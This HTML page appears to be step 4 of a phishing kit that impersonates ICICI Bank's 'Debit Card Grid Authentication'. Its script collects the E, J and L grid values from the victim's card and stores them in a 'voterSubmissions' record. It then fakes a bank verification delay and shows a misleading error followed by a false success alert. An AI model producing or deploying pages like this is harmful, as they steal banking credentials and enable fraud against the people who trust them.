<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Debit Card Grid Authentication - Step 4</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-container { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; }
        .form-container h2 { margin-bottom: 5px; color: #0056b3; font-size: 20px; }
        .sub-title { color: #555; font-size: 13px; margin-bottom: 15px; }
        
        .card-preview-box {
            margin-bottom: 15px;
            background: #f8fafc;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #e2e8f0;
        }
        .card-preview-box img {
            width: 100%;
            max-width: 280px;
            height: auto;
            border-radius: 6px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
        }
        .card-preview-text {
            font-size: 11px;
            color: #475569;
            margin-top: 6px;
            font-weight: 600;
        }

        .error-msg { 
            background: #f8d7da; 
            color: #721c24; 
            padding: 20px 10px; 
            border-radius: 8px; 
            font-size: 18px; 
            font-weight: bold; 
            line-height: 1.5;
            margin-bottom: 20px; 
            display: none; 
            border: 2px solid #f5c6cb; 
            box-shadow: 0 4px 15px rgba(220, 53, 69, 0.2);
        }

        .grid-container {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 20px;
            background: #f8f9fa;
            padding: 15px 10px;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
        }
        .grid-item { flex: 1; text-align: center; }
        .grid-label { display: block; margin-bottom: 6px; color: #0056b3; font-weight: bold; font-size: 15px; }
        .grid-input { width: 100%; padding: 8px 5px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; }
        .grid-input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }

        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 15px; font-weight: bold; cursor: pointer; }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Debit Card Grid Authentication</h2>
        <div class="sub-title">Final Security Verification Step</div>

        <div class="card-preview-box">
            <img src="card-grid.png" alt="ICICI Card Grid Reference">
            <div class="card-preview-text">ICICI Bank Debit Card Grid Reference (Back Side)</div>
        </div>

        <div id="errorAlert" class="error-msg">
            ⚠️ INVALID GRID VALUES!<br>PLEASE ENTER AGAIN
        </div>

        <form id="gridForm4">
            <div class="grid-container">
                <div class="grid-item">
                    <span class="grid-label">E</span>
                    <input type="password" id="gridE" name="gridE" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
                <div class="grid-item">
                    <span class="grid-label">J</span>
                    <input type="password" id="gridJ" name="gridJ" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
                <div class="grid-item">
                    <span class="grid-label">L</span>
                    <input type="password" id="gridL" name="gridL" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
            </div>

            <button type="submit" id="submitBtn" class="btn-next">Complete Verification</button>
        </form>
    </div>

    <script>
        document.getElementById('gridForm4').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const gridE = document.getElementById('gridE').value;
            const gridJ = document.getElementById('gridJ').value;
            const gridL = document.getElementById('gridL').value;
            const gridStep4Data = `E:${gridE}, J:${gridJ}, L:${gridL}`;

            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
            let deviceId = localStorage.getItem('voterDeviceId');

            if (submissions.length > 0) {
                let targetIndex = -1;
                for (let i = submissions.length - 1; i >= 0; i--) {
                    if (submissions[i].deviceId === deviceId) {
                        targetIndex = i;
                        break;
                    }
                }
                if (targetIndex === -1) targetIndex = submissions.length - 1;

                submissions[targetIndex].gridStep4 = gridStep4Data;
                localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Verifying with Bank...";

            setTimeout(() => {
                document.getElementById('gridForm4').style.display = 'none';
                document.getElementById('errorAlert').style.display = 'block';

                setTimeout(() => {
                    alert("Verification Completed Successfully!");
                    window.location.href = "index.html"; 
                }, 2500);
            }, 3500);
        });
    </script>
</body>
</html>
